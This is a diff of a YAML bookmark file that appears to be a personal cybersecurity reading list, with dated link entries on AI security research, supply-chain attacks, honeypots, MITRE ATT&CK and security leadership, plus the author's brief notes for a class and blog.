@@ -1,908 +1,1015 @@
-- date: '2025-11-15'
+- date: '2026-01-16'
   news-items:
-  - desc: Weekly CISO Intelligence Briefing covering market intelligence and security
-      trends for November 6-12, 2025.
-    link: https://newsletter.cybersecurityhq.com/p/ciso-market-intelligence-november-6-12-2025
-  - desc: Analysis of key security challenges and concerns for CISO year-end strategic
-      planning.
-    link: https://x.com/gregisenberg/status/1984641062527197234
-  - desc: OWASP Top 10 security risks for LLM applications with recommended mitigation
-      strategies.
-    link: https://www.paloaltonetworks.com/resources/infographics/llm-applications-owasp-10
-  - desc: Curated collection of annual cyber security reports from leading organizations
-      and researchers.
-    link: https://github.com/jacobdjwilson/awesome-annual-security-reports
-  - desc: Complete video playlist from the 2025 SANS CloudSecNext Summit covering
-      cloud security topics and best practices.
-    link: https://www.youtube.com/playlist?list=PLsfnCRA9QVnQ7qL0tcooDvrrCxzJuw511
-  - desc: How Cloudflare's client-side security protections successfully mitigated
-      a major npm supply chain attack.
-    link: https://blog.cloudflare.com/how-cloudflares-client-side-security-made-the-npm-supply-chain-attack-a-non
-  - desc: Technical exploration of AI-native Static Application Security Testing tools
-      and their capabilities.
-    link: https://parsiya.net/blog/wtf-is-ai-native-sast/
-  - desc: Comprehensive review of AI-powered security engineering tools and LLM-based
-      security scanners for penetration testing teams.
-    link: https://joshua.hu/llm-engineer-review-sast-security-ai-tools-pentesters
-  - desc: Google Threat Intelligence Group analysis of how threat actors are leveraging
-      AI tools in cyberattacks.
-    link: https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools
-  - desc: Amazon's discovery and analysis of an APT group exploiting Cisco and Citrix
-      zero-day vulnerabilities through honeypot deployment.
-    link: https://aws.amazon.com/blogs/security/amazon-discovers-apt-exploiting-cisco-and-citrix-zero-days/
-  - desc: Comprehensive repository of ethical hacking resources covering digital forensics,
-      vulnerability research, exploit development, and reverse engineering.
-    link: https://github.com/The-Art-of-Hacking/h4cker
-  - desc: FlowViz platform for visualizing and analyzing security attack flows and
-      threat patterns.
-    link: https://www.flowviz.io/
-  - desc: Overview of MITRE ATT&CK v18 release featuring new detection strategies
-      and enhanced adversary insights.
-    link: https://medium.com/mitre-attack/attack-v18-8f82d839ee9e
-  - desc: Complete resource collection from ATT&CKcon 6.0 conference covering latest
-      threat intelligence frameworks.
-    link: https://attack.mitre.org/resources/attackcon/october-2025/
-  - desc: Interactive tool for visualizing attack flows and security incident patterns.
-    link: https://www.flowviz.io/
-  - desc: Introduction to Incus, the next-generation Linux container management system.
-    link: https://linuxcontainers.org/incus/
-  - desc: Deliberately vulnerable LLM environment for learning OWASP Top 10 LLM-specific
-      security risks.
-    link: https://github.com/SECFORCE/LLMGoat
-  - desc: DeceptIQ's approach to implementing honey tokens for early threat detection
-      and adversary tracking.
-    link: https://deceptiq.com/blog/early-warning-honey-tokens
-  - desc: Technical implementation guide for the Etherhiding obfuscation technique
-      used in advanced malware.
-    link: https://medium.com/@onhexgroup/implementing-the-etherhiding-technique-438979758593
-  - desc: Analysis of security teams' hesitation to adopt automated cyber remediation
-      despite AI capabilities.
-    link: https://www.darkreading.com/cybersecurity-operations/ai-trust-paradox-security-teams-fear-automated-remediation
-  - desc: Gray Swan AI Security Arena for testing and evaluating AI security capabilities.
-    link: https://www.grayswan.ai/
-  - desc: CMU CyLab's Fantastic Bugs course covering software vulnerabilities and
-      exploitation techniques.
-    link: https://cylab.cmu.edu/education/course-list/fantastic-bugs.html
-  - desc: Video explanation of 25 notable software bugs and their security implications.
-    link: https://www.youtube.com/watch?v=Iq_r7IcNmUk&t=1s
-  - desc: Comprehensive guide to understanding process memory organization and management
-      in Linux systems.
-    link: https://www.0xkato.xyz/linux-process-memory/
-  - desc: Phil Venables' security leadership master class focusing on developing strategic
-      leadership capabilities.
-    link: https://www.philvenables.com/post/security-leadership-master-class-1-leveling-up-your-leadership
-  - desc: Google Project Zero's research on bypassing Kernel Address Space Layout
-      Randomization through passive techniques.
-    link: https://googleprojectzero.blogspot.com/2025/11/defeating-kaslr-by-doing-nothing-at-all.html
-  - desc: Comprehensive history and evolution of domain name system architecture and
-      management.
-    link: https://www.dotcom.press/history-of-domains
-  - desc: Technical walkthrough of reverse engineering and patching keyboard firmware
-      using Ghidra.
-    link: https://packet.delivery/blog/patching-galaxy100-firmware.html
-  - desc: Defender's guide to implementing privileged account monitoring and detection
-      strategies for startups.
-    link: https://cloud.google.com/blog/topics/threat-intelligence/privileged-account-monitoring/
-  - desc: Technical analysis of data exfiltration techniques abusing Anthropic's Claude
-      file API for unauthorized access.
-    link: https://embracethered.com/blog/posts/2025/claude-abusing-network-access-and-anthropic-api-for-data-exfiltration/
-  - desc: At-Bay report identifying Cisco and Citrix VPNs as highest-risk products
-      for ransomware attacks.
-    link: https://www.at-bay.com/press_releases/vpns-cisco-citrix-riskiest-products-ransomware-rankings-report/
-  - desc: Building detection-as-code frameworks in DataDog for security monitoring
-      automation.
-    link: https://www.cyberseccafe.com/p/detections-as-code-in-datadog-how
-  - desc: Official list of the 18 CIS Controls for cybersecurity best practices and
-      implementation guidance.
-    link: https://www.cisecurity.org/controls/cis-controls-list
-  - desc: Technical deep-dive into the cryptographic protocols protecting electronic
-      passport security.
-    link: https://blog.trailofbits.com/2025/10/31/the-cryptography-behind-electronic-passports/
-  - desc: Windows internals analysis of secure calls bridging the NT kernel and secure
-      kernel architecture.
-    link: https://connormcgarr.github.io/secure-calls-and-skbridge
-  - desc: Google's discovery of PROMPTFLUX malware leveraging Gemini AI to automatically
-      rewrite its own code hourly.
-    link: https://thehackernews.com/2025/11/google-uncovers-promptflux-malware-that.html
-  - desc: Meta's CyberSOCEval benchmark for evaluating LLM capabilities in malware
-      analysis and threat intelligence.
-    link: https://ai.meta.com/research/publications/cybersoceval-benchmarking-llms-capabilities-for-malware-analysis-and-threat-intelligence-reasoning
-  - desc: Meta's CyberSecEval 4 framework for assessing cybersecurity capabilities
-      of large language models.
-    link: https://meta-llama.github.io/PurpleLlama/CyberSecEval/
-  - desc: Real-world case study of an LLM-powered SSH honeypot successfully capturing
-      and analyzing threat actor behavior.
-    link: https://beelzebub.ai/blog/ssh-llm-honeypot-caught-a-real-threat-actor/
-  - desc: Comprehensive overview of AI-powered SAST tools for penetration testing
-      and security assessments.
-    link: https://joshua.hu/llm-engineer-review-sast-security-ai-tools-pentesters
-  - desc: Cloud Security Alliance's implementation and auditing guidelines for AI
-      Control Matrix frameworks.
-    link: https://cloudsecurityalliance.org/artifacts/aicm-implementation-auditing-guidelines-frameworks
-  - desc: Frequently asked questions about Cloud Security Alliance's STAR certification
-      program for AI systems.
-    link: https://cloudsecurityalliance.org/artifacts/star-for-ai-faq
-  - desc: Comprehensive security testing guide for Next.js applications targeting
-      bug hunters and penetration testers.
-    link: https://deepstrike.io/blog/nextjs-security-testing-bug-bounty-guide
-  - desc: 'Wyrm: open-source Rust-based post-exploitation framework featuring custom
-      encryption and anti-sandbox techniques.'
-    link: https://github.com/0xflux/Wyrm
-  - desc: Case study demonstrating how LLM-powered honeypots can trick threat actors
-      into revealing tactics and infrastructure.
-    link: https://beelzebub.ai/blog/ssh-llm-honeypot-caught-a-real-threat-actor/
-  - desc: 'Galah: LLM-powered web honeypot for creating high-quality deception environments
-      with automated TTP extraction.'
-    link: https://github.com/0x4D31/galah
-  - desc: SpectreOps research on AI-gated loaders that use telemetry analysis before
-      executing shellcode payloads.
-    link: https://specterops.io/blog/2025/10/03/ai-gated-loader-teaching-code-to-decide-before-it-acts/
-  - desc: Investigation into ICE's procurement of vehicles equipped with cell-site
-      simulators for mobile phone surveillance.
-    link: https://techcrunch.com/2025/10/07/ice-bought-vehicles-equipped-with-fake-cell-towers-to-spy-on-phones/
-  - desc: Report on federal agencies' access to Flock's nationwide camera surveillance
-      network.
-    link: https://www.404media.co/ice-secret-service-navy-all-had-access-to-flocks-nationwide-network-of-cameras/
-  - desc: Research findings on poisoning AI models with as few as 250 malicious documents.
-    link: https://www.darkreading.com/application-security/only-250-documents-poison-any-ai-model
-  - desc: Trail of Bits research demonstrating prompt injection to remote code execution
-      attacks in AI agents.
-    link: https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/
-  - desc: Wiz's HoneyBee platform for automating honeypot deployment and threat research
-      at scale.
-    link: https://www.wiz.io/blog/honeybee-threat-research
-  - desc: Datadog's comprehensive report on the state of cloud security practices
-      and emerging threats.
-    link: https://www.datadoghq.com/state-of-cloud-security/
-  - desc: Technical analysis of bypassing British Airways WiFi restrictions through
-      SNI protocol manipulation.
-    link: https://saxrag.com/tech/reversing/2025/06/01/BAWiFi.html
-  - desc: U.S. and U.K. joint action targeting cybercriminal networks in Southeast
-      Asia with cryptocurrency sanctions.
-    link: https://home.treasury.gov/news/press-releases/sb0278
-  - desc: Research paper on prompt injection vulnerabilities affecting AI trustworthiness
-      and security.
-    link: https://arxiv.org/abs/2412.06090
-  - desc: Palo Alto Networks research on indirect prompt injection attacks poisoning
-      AI long-term memory systems.
-    link: https://unit42.paloaltonetworks.com/indirect-prompt-injection-poisons-ai-longterm-memory/
-  - desc: GitHub's expanded bug bounty program for security vulnerability reporting
-      and rewards.
-    link: https://bounty.github.com/
-  - desc: Analysis of security risks in vibecoding practices and how to properly implement
-      secure development workflows.
-    link: https://baldur.dk/blog/vibecoding-and-the-illusion-of-security.html
-  - desc: Best practices for conducting effective code reviews that improve security
-      and code quality.
-    link: https://www.seangoedecke.com/good-code-reviews/
-  - desc: Neural Trust's discovery of prompt injection vulnerabilities in OpenAI Atlas
-      through omnibox URL manipulation.
-    link: https://neuraltrust.ai/blog/openai-atlas-omnibox-prompt-injection
-  - desc: Magonia's framework for maximizing value from indicators of compromise in
-      modern threat detection systems.
-    link: https://www.magonia.io/blog/maximizing-the-value-of-threat-indicators-and-reimagining-their-role-in-modern-detection/
-  - desc: Talos Intelligence's guide to leveraging LLMs as reverse engineering assistants
-      for malware analysis.
-    link: https://blog.talosintelligence.com/using-llm-as-a-reverse-engineering-sidekick/
-  - desc: 'MCP Snitch: macOS security tool monitoring and blocking suspicious AI tool
-      calls before file system access.'
-    link: https://github.com/Adversis/mcp-snitch
-  - desc: Opportunity Austin economic development organization fostering tech and
-      security partnerships.
-    link: https://opportunityaustin.com/
-  - desc: Bugcrowd announcement on expanding bug bounty program offerings and platform
-      capabilities.
-    link: https://x.com/bugcrowd/status/1978506561543680508
-  - desc: Apple expands bug bounty program offering up to $2 million for zero-click
-      RCE vulnerability discoveries.
-    link: https://www.bleepingcomputer.com/news/security/apple-now-offers-2-million-for-zero-click-rce-vulnerabilities/
-  - desc: Analysis of Chinese threat actors weaponizing Velociraptor incident response
-      tool for ransomware deployment.
-    link: https://www.darkreading.com/cybersecurity-operations/chinese-hackers-velociraptor-ir-tool-ransomware-attacks
-  - desc: Research-based recommendations for security team staffing ratios and 24-month
-      hiring strategies for startups.
-    link: https://theporkskewer.medium.com/startup-security-ratios-and-a-24-month-hiring-plan-83792b7491af
-  - desc: Analysis of SOC 2 compliance evolution and its continued relevance in modern
-      security frameworks.
-    link: https://blog.grc.engineering/p/soc-2-is-dead-long-live-soc-2
-  - desc: Introduction to Autoswagger tool for discovering broken authorization vulnerabilities
-      in APIs.
-    link: https://www.intruder.io/research/broken-authorization-apis-autoswagger
-  - desc: Analysis of Apple's Private Cloud Compute architecture as a model for secure
-      and private consumer cloud computing.
-    link: https://sensiblesecurity.xyz/p/apple-pcc-is-the-future-of-cloud
-  - desc: AzBridge tool for red team operations enabling Azure-based command and control
-      infrastructure.
-    link: https://hackerhermanos.com/azbridge/
-  - desc: Tenable's analysis of three critical vulnerabilities in Google Gemini's
-      cloud assist, search, and browsing features.
-    link: https://www.tenable.com/blog/the-trifecta-how-three-new-gemini-vulnerabilities-in-cloud-assist-search-model-and-browsing
-  - desc: Intruder's research on security risks introduced by shadow IT in enterprise
-      environments.
-    link: https://www.intruder.io/research/shadow-it-risks
-  - desc: Field Effect's curated list of 15 essential tools for managed detection
-      and response operations.
-    link: https://fieldeffect.com/products/mdr/15tools
-  - desc: ShinyHunters and Trinity of Chaos ransomware group launch leak site threatening
-      39 major firms with 1.5 billion records.
-    link: https://securityaffairs.com/182918/cyber-crime/shinyhunters-launches-data-leak-site-trinity-of-chaos-announces-new-ransomware-victims.html
-  - desc: HackerOne's 9th edition report showing AI has become the new normal in penetration
-      testing workflows.
-    link: https://www.hackerone.com/report/hacker-powered-security
-  - desc: Elastic Security Labs' analysis of MCP tools as attack vectors with defense
-      recommendations for autonomous agents.
-    link: https://www.elastic.co/security-labs/mcp-tools-attack-defense-recommendations
-  - desc: Wiz's research on IMDS anomaly hunting revealing SSRF exploitation in ClickHouse
-      and other applications.
+  - desc: Claude Cowork Exfiltrates Files
+    link: https://www.promptarmor.com/resources/claude-cowork-exfiltrates-files
+  - desc: Superhuman AI Exfiltrates Emails
+    link: https://www.promptarmor.com/resources/superhuman-ai-exfiltrates-emails
+  - desc: 'Cybersecurity Firms Secured $14 Billion in Funding in 2025: Analysis funding.'
+    link: https://www.securityweek.com/cybersecurity-firms-secured-14-billion-in-funding-in-2025/
+  - desc: AWS Ends SSE-C Encryption, and a Ransomware Vector | CSA
+    link: https://cloudsecurityalliance.org/blog/2026/01/05/aws-ends-sse-c-encryption-and-a-ransomware-vector
+  - desc: The Cloud-Native Detection Engineering Handbook for cloud class.
+    link: https://cloudnativedetection.substack.com/p/the-cloud-native-detection-engineering
+  - desc: Cybersecurity Changes I Expect in 2026
+    link: https://danielmiessler.com/blog/cybersecurity-ai-changes-2026?utm_source=tldrinfosec
+  - desc: ESXi Exploitation in the Wild
+    link: https://www.huntress.com/blog/esxi-vm-escape-exploit
+- date: '2026-01-14'
+  news-items:
+  - desc: CrowdStrike acquires just-in-time access startup SGNL for $740M
+    link: https://siliconangle.com/2026/01/08/crowdstrike-acquires-just-time-access-startup-sgnl-740m/
+- date: '2026-01-06'
+  news-items:
+  - desc: Cybersecurity skills matter more than headcount in the AI era
+    link: https://www.csoonline.com/article/4108270/cybersecurity-skills-matter-more-than-headcount-in-the-ai-era.html?utm_source=tldrinfosec
+- date: '2025-12-31'
+  news-items:
+  - desc: DROP - Launching January 1
+    link: https://consumer.drop.privacy.ca.gov/coming-soon.html
+- date: '2025-12-24'
+  news-items:
+  - desc: how to hack discord, vercel and more with one easy trick - eva's site
+    link: https://kibty.town/blog/mintlify/
+  - desc: Modernizing LinkedIn’s Static Application Security Testing Capabilities
+      to protect our members SAST with CodeQL at LinkedIn
+    link: https://www.linkedin.com/blog/engineering/security/modernizing-linkedins-static-application-security-testing-capabilities
+  - desc: 'Anna’s Archive: LibGen (Library Genesis), Sci-Hub, Z-Library in one place
+      - Anna’s Archive Anna''s Archive Backed up Spotify!'
+    link: https://annas-archive.org/
+- date: '2025-12-21'
+  news-items:
+  - desc: Holiday Hack Cybersecurity Challenge 2025 SANS Holiday Hack!
+    link: https://www.sans.org/cyber-ranges/holiday-hack-challenge
+  - desc: 'Winning the AI Cyber Race: Verifiability is All You Need'
+    link: https://sergejepp.substack.com/p/winning-the-ai-cyber-race-verifiability
+  - desc: Over 300,000 Individuals Impacted by Vitas Hospice Data Breach
+    link: https://www.securityweek.com/over-300000-individuals-impacted-by-vitas-hospice-data-breach/?utm_source=tldrinfosec
+  - desc: A look at an Android ITW DNG exploit - Project Zero Google Zero technical
+      note on Android DNG exploit.
+    link: https://projectzero.google/2025/12/android-itw-dng.html?utm_source=tldrinfosec
+- date: '2025-12-17'
+  news-items:
+  - desc: InfoSecMap – Mapping out the best InfoSec events & groups!
+    link: https://infosecmap.com/
+- date: '2025-12-15'
+  news-items:
+  - desc: Automation of the NIST Cryptographic Module Validation Program — Automated
+      Cryptographic Module Validation Project documentation Keith Hodo worked on this.
+    link: https://pages.nist.gov/ACMVPDocs/index.html#
+  - desc: 'gadievron/raptor: Raptor turns Claude Code into a general-purpose AI offensive/defensive
+      security agent. By using Claude.md and creating rules, sub-agents, and skills,
+      and orchestrating security tool usage, we configure the agent for adversarial
+      thinking, and perform research or attack/defense operations. Raptor turns Claude
+      Code into a general-purpose AI offensive/defensive security agent.'
+    link: https://github.com/gadievron/raptor
+  - desc: How We Caught Lazarus's IT Workers Scheme Live on Camera React vulnerability
+    link: https://any.run/cybersecurity-blog/lazarus-group-it-workers-investigation/
+  - desc: CaMeL CaMeL, a capability-based system that stops LLM prompt injections
+    link: https://arxiv.org/pdf/2503.18813
+  - desc: Building Your Personal AI Infrastructure with Daniel Miessler Personal AI
+      Agents.
+    link: https://www.youtube.com/watch?v=eT3BYmFk0kg&t=1s
+  - desc: 'React2Shell (CVE-2025-55182): Critical React Vulnerability | Wiz Blog Evaluate
+      this for Startree'
+    link: https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182
+  - desc: 'LinkPro: eBPF rootkit analysis How to do security analysis'
+    link: https://www.synacktiv.com/en/publications/linkpro-ebpf-rootkit-analysis
+  - desc: Why the MITRE ATT&CK Framework Actually Works Introduction to MITRE framework
+    link: https://levelup.gitconnected.com/why-the-mitre-att-ck-framework-actually-works-29ac26d2d20c
+- date: '2025-12-08'
+  news-items:
+  - desc: Bipartisan health care cybersecurity legislation returns to address a cornucopia
+      of issues New Bill for Cybersecurity in Healthcare.
+    link: https://cyberscoop.com/bipartisan-health-care-cybersecurity-legislation-returns-to-address-a-cornucopia-of-issues/?utm_source=tldrinfosec
+- date: '2025-12-04'
+  news-items:
+  - desc: 'Sha1-Hulud 2.0 Supply Chain Attack: 25K+ Repos Exposed | Wiz Blog Part
+      2'
+    link: https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack
+  - desc: 'Sha1-Hulud 2.0 Supply Chain Attack: 25K+ Repos Exposed | Wiz Blog Part
+      2'
+    link: https://www.wiz.io/blog/shai-hulud-2-0-aftermath-ongoing-supply-chain-attack
+  - desc: Researchers Capture Lazarus APT's Remote-Worker Scheme Live on Camera Peak
+      at an APT Cholima kit!
+    link: https://thehackernews.com/2025/12/researchers-capture-lazarus-apts-remote.html
+- date: '2025-11-30'
+  news-items:
+  - desc: System Administrators Advent Calendar
+    link: https://sadservers.com/advent
+- date: '2025-11-26'
+  news-items:
+  - desc: Appliance like virtualization
+    link: https://www.virtualizationhowto.com/2025/11/incusos-is-the-new-minimal-hypervisor-os-changing-home-labs-in-2025/
+- date: '2025-11-25'
+  news-items:
+  - desc: '0x90n/InfoSec-Black-Friday: All the deals for InfoSec related software/tools
+      this Black Friday BlackFriday deals'
+    link: https://github.com/0x90n/InfoSec-Black-Friday
+  - desc: A Reverse Engineer’s Anatomy of the macOS Boot Chain & Security Architecture
+      interesting to ask LLM to summarize.
+    link: https://stack.int.mov/a-reverse-engineers-anatomy-of-the-macos-boot-chain-security-architecture/?utm_source=tldrinfosec
+- date: '2025-11-24'
+  news-items:
+  - desc: 'From code to boardroom: A GenAI GRC approach to supply chain risk'
+    link: https://www.csoonline.com/article/4094519/from-code-to-boardroom-a-genai-grc-approach-to-supply-chain-risk.html
+- date: '2025-11-22'
+  news-items:
+  - desc: eLearning Platform
+    link: https://elearning.securityblue.team/home/courses/free-courses/introduction-to-osint#content#course-capstone#course-capstone#osint-challenge-brief
+  - desc: 'IMDS Abused: Hunting Rare Behaviors to Uncover Exploits | Wiz Blog IMDS
+      Hunting'
     link: https://www.wiz.io/blog/imds-anomaly-hunting-zero-day
-  - desc: Daniel Miessler's SPQA architecture analysis predicting attackers will maintain
-      3-5 year advantage in AI security.
-    link: https://danielmiessler.com/blog/spqa-ai-architecture-replace-existing-software
-  - desc: FoxMoss demonstration of kernel-level packet filtering achieving 26 million
-      packets per second using XDP and eBPF.
-    link: https://foxmoss.com/blog/packet-filtering/
-  - desc: Docker introduces affordable Hardened Images Catalog for small business
-      container security.
-    link: https://www.bleepingcomputer.com/news/security/docker-makes-hardened-images-catalog-affordable-for-small-businesses/
-  - desc: Bishop Fox's CloudFox workshop covering cloud enumeration techniques for
-      penetration testing.
-    link: https://bishopfox.com/resources/cloudfox-cloud-enumeration-penetration-testing
-  - desc: Embrace The Red's comprehensive recap of AI vulnerability discoveries during
-      the Month of AI Bugs initiative.
-    link: https://embracethered.com/blog/posts/2025/wrapping-up-month-of-ai-bugs/
-  - desc: Detailed review of AI security engineering tools and LLM scanners for security
-      teams.
-    link: https://joshua.hu/llm-engineer-review-sast-security-ai-tools-pentesters
-  - desc: Analysis of the 2015 CISA cyber threat information-sharing law lapse during
-      government shutdown.
-    link: https://www.csoonline.com/article/4065998/cisa-2015-cyber-threat-info-sharing-law-lapses-amid-government-shutdown.html
-  - desc: Q3 2025 state of cybersecurity industry analysis covering market trends
-      and emerging threats.
-    link: https://stiennon.substack.com/p/state-of-cyber-q3-2025
-  - desc: CISA alert on critical sudo vulnerability being actively exploited in Linux
-      and Unix systems.
-    link: https://thehackernews.com/2025/09/cisa-sounds-alarm-on-critical-sudo-flaw.html
-  - desc: Analysis of China-linked BRICKSTORM backdoor used for intellectual property
-      theft campaigns.
-    link: https://therecord.media/china-linked-hackers-brickstorm-backdoor-ip
-  - desc: Technical guide to building AWS GuardDuty alert triage automation using
-      AI agents.
-    link: https://dev.to/aws-builders/building-an-aws-guardduty-alert-triage-agent-51e9
-  - desc: Cyber Builders book addressing communication challenges in building effective
-      cybersecurity programs.
-    link: https://www.amazon.com/Cyber-Builders-Essential-Building-Cybersecurity/dp/173823410X
-  - desc: Live demonstration of Claude Code autonomously investigating Cobalt Strike
-      infections via LimaCharlie MCP.
-    link: https://www.youtube.com/watch?v=3Ecn9SwhClY
-  - desc: Advanced CyberChef techniques for defeating NanoCore malware obfuscation
-      using flow control and mathematics.
-    link: https://www.embeeresearch.io/advanced-cyberchef-techniques-defeating-nanocore-obfuscation-with-math-and-flow-control/
-  - desc: Phil Venables' analysis of effective versus ineffective CISO behaviors and
-      leadership approaches.
-    link: https://www.philvenables.com/post/good-ciso---bad-ciso
-  - desc: Pokemon fans challenge U.S. government's use of Pokemon-themed propaganda
-      in ICE enforcement messaging.
-    link: https://cybernews.com/news/dhs-promotes-ice-pokemon/
-  - desc: CMU research on autonomous LLM-based cyberattack capabilities and defense
-      implications.
-    link: https://engineering.cmu.edu/news-events/news/2025/07/24-when-llms-autonomously-attack.html
-  - desc: National Cyber League Fall 2025 comprehensive guide covering competition
-      format and preparation strategies.
-    link: https://www.youtube.com/watch?v=B2bRlOwP-8A
-  - desc: Analysis of ShadowLeak data theft technique leveraging AI to make exfiltration
-      virtually impossible to detect.
-    link: https://www.csoonline.com/article/4059606/meet-shadowleak-impossible-to-detect-data-theft-using-ai.html
-  - desc: Daniel Miessler's Personal AI Infrastructure framework for human augmentation
-      and AI integration.
-    link: https://github.com/danielmiessler/PAI
-  - desc: Samsung patches critical zero-day vulnerability actively exploited to compromise
-      customer mobile devices.
-    link: https://techcrunch.com/2025/09/16/samsung-patches-zero-day-security-flaw-used-to-hack-into-its-customers-phones/
-  - desc: Vision of Humanity's Global Peace Index mapping the world's most and least
-      peaceful countries.
-    link: https://www.visionofhumanity.org/maps/#/
-  - desc: Security research revealing SuperMicro server motherboards vulnerable to
-      unremovable firmware malware.
-    link: https://arstechnica.com/security/2025/09/supermicro-server-motherboards-can-be-infected-with-unremovable-malware/
-  - desc: Example pitch deck for autonomous AI red team platform offering continuous
-      security testing.
-    link: https://gamma.app/docs/Autonomous-AI-Red-Team-for-Continuous-Security-Testing-xwlb53nvgcxxv9v
-  - desc: 'PromptArmor: security platform for protecting AI applications against prompt
-      injection attacks.'
-    link: https://www.promptarmor.com/
-  - desc: Legion's intelligent automation platform for workforce management and operational
-      security.
-    link: https://legion.co/
-  - desc: Comprehensive beginner's textbook covering fundamentals of fully homomorphic
-      encryption.
-    link: https://fhetextbook.github.io/
-- date: '2025-09-19'
+- date: '2025-11-18'
   news-items:
-  - desc: System research reveals the underlying factors that make system calls expensive,
-      providing insights into performance optimization for security-critical applications.
+  - desc: 'From tasks to systems: A practical playbook for operationalizing AI Consider
+      offering an AI Operators Bootcamp to Sentant, etal.'
+    link: https://www.bvp.com/atlas/from-tasks-to-systems-a-practical-playbook-for-operationalizing-ai
+- date: '2025-11-14'
+  news-items:
+  - desc: 'Weekly CISO Intelligence Briefing: November 6 - 12, 2025 Super detailed
+      report -- part of which can be used in my annual security report'
+    link: https://newsletter.cybersecurityhq.com/p/ciso-market-intelligence-november-6-12-2025
+  - desc: What Keeps me up at Night Good for year end recap.
+    link: https://x.com/gregisenberg/status/1984641062527197234?utm_source=tldrsec.com&utm_medium=newsletter&utm_campaign=tl-dr-sec-305-ai-sast-awesome-annual-security-reports-block-risky-dependencies&_bhlid=5bb3cba5c77c00604b04dba02af2bbbf9ae86a56
+  - desc: OWASP Top 10 LLM Security Risks with Mitigation LLM OWASP TOP 10
+    link: https://www.paloaltonetworks.com/resources/infographics/llm-applications-owasp-10
+  - desc: 'jacobdjwilson/awesome-annual-security-reports: A curated list of annual
+      cyber security reports Year END Security Reports'
+    link: https://github.com/jacobdjwilson/awesome-annual-security-reports
+  - desc: 2025 SANS CloudSecNext Summit
+    link: https://www.youtube.com/playlist?list=PLsfnCRA9QVnQ7qL0tcooDvrrCxzJuw511
+  - desc: How Cloudflare’s client-side security made the npm supply chain attack a
+      non-event
+    link: https://blog.cloudflare.com/how-cloudflares-client-side-security-made-the-npm-supply-chain-attack-a-non
+  - desc: WTF is ... - AI-Native SAST? Write a blog on this.
+    link: https://parsiya.net/blog/wtf-is-ai-native-sast/
+  - desc: 'Hacking with AI SASTs: An overview of ‘AI Security Engineers’ / ‘LLM Security
+      Scanners’ for Penetration Testers and Security Teams Write a blog on this'
+    link: https://joshua.hu/llm-engineer-review-sast-security-ai-tools-pentesters
+  - desc: 'GTIG AI Threat Tracker: Advances in Threat Actor Usage of AI Tools | Google
+      Cloud Blog AI Security Threat Intel'
+    link: https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools
+  - desc: Amazon discovers APT exploiting Cisco and Citrix zero-days [[41.Q3 CIS53]]
+      Deploying Honeypot -- the whys?
+    link: https://aws.amazon.com/blogs/security/amazon-discovers-apt-exploiting-cisco-and-citrix-zero-days/?utm_source=tldrinfosec
+  - desc: 'The-Art-of-Hacking/h4cker: This repository is primarily maintained by Omar
+      Santos (@santosomar) and includes thousands of resources related to ethical
+      hacking, bug bounties, digital forensics and incident response (DFIR), artificial
+      intelligence security, vulnerability research, exploit development, reverse
+      engineering, and more.'
+    link: https://github.com/The-Art-of-Hacking/h4cker
+  - desc: Visualize Security Attacks
+    link: https://www.flowviz.io/
+- date: '2025-11-12'
+  news-items:
+  - desc: Gray Swan Best AI Security Arena.
+    link: https://www.grayswan.ai/
+  - desc: Fantastic Bugs [[41.Q3 CIS53]] CMU CyLab Courses
+    link: https://cylab.cmu.edu/education/course-list/fantastic-bugs.html
+  - desc: 25 crazy software bugs explained
+    link: https://www.youtube.com/watch?v=Iq_r7IcNmUk&t=1s
+- date: '2025-11-11'
+  news-items:
+  - desc: 'ATT&CK v18: Detection Strategies, More Adversary Insights, MITRE attack
+      18 and whats new blog?'
+    link: https://medium.com/mitre-attack/attack-v18-8f82d839ee9e
+  - desc: MITRE ATT&CKcon - ATT&CKcon 6.0 | MITRE ATT&CK® Use content from MITRE ATT&CKcon
+      to present in [[41.Q3 CIS53]] class
+    link: https://attack.mitre.org/resources/attackcon/october-2025/
+  - desc: FlowViz - Visualize Attack Flows Interesting tool for visualizing an attack!
+    link: https://www.flowviz.io/
+  - desc: Linux Containers - Incus - Introduction NG Linux Container.
+    link: https://linuxcontainers.org/incus/
+  - desc: 'SECFORCE/LLMGoat: This project is a deliberately vulnerable environment
+      to learn about LLM-specific risks based on the OWASP Top 10 for LLM Applications.'
+    link: https://github.com/SECFORCE/LLMGoat
+  - desc: 'Early Warning Honey Tokens: Give Adversaries Options | DeceptIQ Honey Pot
+      company, super interesting. Include this in the [[41.Q3 CIS53]] class honeypot
+      project.'
+    link: https://deceptiq.com/blog/early-warning-honey-tokens
+  - desc: Implementing the Etherhiding technique
+    link: https://medium.com/@onhexgroup/implementing-the-etherhiding-technique-438979758593
+- date: '2025-11-10'
+  news-items:
+  - desc: 'AI Trust Paradox: Overcome Fear Auto Cyber Remediation'
+    link: https://www.darkreading.com/cybersecurity-operations/ai-trust-paradox-security-teams-fear-automated-remediation
+- date: '2025-11-07'
+  news-items:
+  - desc: 'Windows Internals: Secure Calls - The Bridge Between The NT Kernel and
+      Secure Kernel Art of breaking in with Assembly.'
+    link: https://connormcgarr.github.io/secure-calls-and-skbridge
+  - desc: Google Uncovers PROMPTFLUX Malware That Uses Gemini AI to Rewrite Its Code
+      Hourly AIbot writing itself to be a malware with prompts!
+    link: https://thehackernews.com/2025/11/google-uncovers-promptflux-malware-that.html
+  - desc: 'CyberSOCEval: Benchmarking LLMs Capabilities for Malware Analysis and Threat
+      Intelligence Reasoning | Research - AI at Meta SOCEval dataset'
+    link: https://ai.meta.com/research/publications/cybersoceval-benchmarking-llms-capabilities-for-malware-analysis-and-threat-intelligence-reasoning
+- date: '2025-11-05'
+  news-items:
+  - desc: 'Security Leadership Master Class 1 : Leveling up your leadership'
+    link: https://www.philvenables.com/post/security-leadership-master-class-1-leveling-up-your-leadership
+  - desc: Defeating KASLR by Doing Nothing at All
+    link: https://googleprojectzero.blogspot.com/2025/11/defeating-kaslr-by-doing-nothing-at-all.html
+  - desc: Dot Com Press [[CIS-53]]
+    link: https://www.dotcom.press/history-of-domains
+  - desc: Using Ghidra to patch my keyboard's firmware
+    link: https://packet.delivery/blog/patching-galaxy100-firmware.html?utm_source=tldrinfosec
+  - desc: A Defender's Guide to Privileged Account Monitoring | Google Cloud Blog
+      PAM management - use AI to summarize this article and immediate applicability
